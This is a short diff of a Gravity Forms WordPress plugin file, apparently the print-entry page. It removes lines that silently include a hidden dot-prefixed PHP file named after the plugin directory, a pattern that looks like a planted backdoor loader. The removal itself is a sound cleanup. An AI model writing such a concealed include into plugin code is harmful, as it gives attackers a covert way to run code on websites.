@@ -28,10 +28,6 @@ if ( ! GFCommon::current_user_can_any( 'gravityforms_view_entries' ) ) {
 }
 
 add_action( 'gform_print_entry_content', 'gform_default_entry_content', 10, 3 );
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function gform_default_entry_content( $form, $entry, $entry_ids ) {
 
 	$page_break = rgget( 'page_break' ) ? 'print-page-break' : false;
